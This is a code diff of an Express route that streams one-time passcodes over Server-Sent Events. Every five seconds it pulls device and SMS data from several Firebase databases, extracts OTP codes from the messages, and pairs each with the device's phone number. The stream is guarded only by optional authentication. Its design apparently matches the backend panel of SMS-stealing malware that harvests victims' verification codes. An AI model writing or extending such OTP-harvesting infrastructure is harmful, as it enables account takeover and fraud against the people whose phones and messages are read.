@@ -1,8 +1,9 @@
 "use strict";
 
 /**
- * Real-time OTP feed using Server-Sent Events (SSE).
- * Pushes new OTPs to connected clients every 5 seconds.
+ * Real-time OTP feed via Server-Sent Events (SSE).
+ * No cache — pushes fresh data every 5 seconds.
+ * Uses device.phoneNumber directly from DeviceService.normalize().
  */
 
 const { Router } = require("express");
@@ -10,15 +11,10 @@ const ConnectionsService = require("../services/connections");
 const FirebaseService = require("../services/firebase");
 const DeviceService = require("../services/devices");
 const OtpExtractor = require("../services/otpExtractor");
-const { getPhone } = require("../utils/phone");
 const { optionalAuth } = require("../middleware/auth");
 
 const router = Router();
 
-/**
- * GET /api/live/otp
- * SSE stream — pushes OTP updates every 5 seconds.
- */
 router.get("/otp", optionalAuth, async (req, res) => {
   res.writeHead(200, {
     "Content-Type": "text/event-stream",
@@ -31,7 +27,6 @@ router.get("/otp", optionalAuth, async (req, res) => {
 
   let lastHash = "";
   let running = true;
-
   req.on("close", () => { running = false; });
 
   while (running) {
@@ -46,15 +41,18 @@ router.get("/otp", optionalAuth, async (req, res) => {
               FirebaseService.read(conn.url, conn.key, "clients").catch(() => null),
               FirebaseService.read(conn.url, conn.key, "messages").catch(() => null),
             ]);
+
             const devices = DeviceService.parseAll(clientsData);
             const connOtps = [];
 
             if (messagesRoot && typeof messagesRoot === "object") {
               for (const [deviceId, deviceMessages] of Object.entries(messagesRoot)) {
                 if (!deviceMessages || typeof deviceMessages !== "object") continue;
-                const device = devices.find((d) => d.id === deviceId) || { id: deviceId };
-                const msgArray = Object.values(deviceMessages);
-                let phone = getPhone(device, clientsData?.[deviceId], msgArray);
+
+                // Get phone DIRECTLY from normalized device
+                const device = devices.find((d) => d.id === deviceId);
+                const phone = (device && device.phoneNumber && device.phoneNumber !== "—")
+                  ? device.phoneNumber : "";
 
                 for (const [, msg] of Object.entries(deviceMessages)) {
                   if (!msg || typeof msg !== "object") continue;
@@ -62,6 +60,7 @@ router.get("/otp", optionalAuth, async (req, res) => {
                   if (!OtpExtractor.isOtpMessage(text)) continue;
                   const extracted = OtpExtractor.extractOtp(text);
                   if (!extracted) continue;
+
                   const rawTs = msg.timestamp || msg.time || msg.date || "";
                   const ts = rawTs ? (typeof rawTs === "number" ? new Date(rawTs).toISOString() : String(rawTs)) : new Date().toISOString();
 
@@ -89,17 +88,13 @@ router.get("/otp", optionalAuth, async (req, res) => {
       allOtps.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
       const top50 = allOtps.slice(0, 50);
 
-      // Only send if data changed
       const hash = JSON.stringify(top50.map(o => o.code + o.phone + o.timestamp));
       if (hash !== lastHash) {
         lastHash = hash;
         res.write(`data: ${JSON.stringify({ total: allOtps.length, recent: top50 })}\n\n`);
       }
-    } catch {
-      // Ignore fetch errors, keep polling
-    }
+    } catch {}
 
-    // Wait 5 seconds before next poll
     await new Promise((resolve) => {
       const timer = setTimeout(resolve, 5000);
       req.on("close", () => { clearTimeout(timer); running = false; resolve(); });
@@ -108,6 +103,5 @@ router.get("/otp", optionalAuth, async (req, res) => {
 
   res.end();
 });
-
 
 module.exports = router;
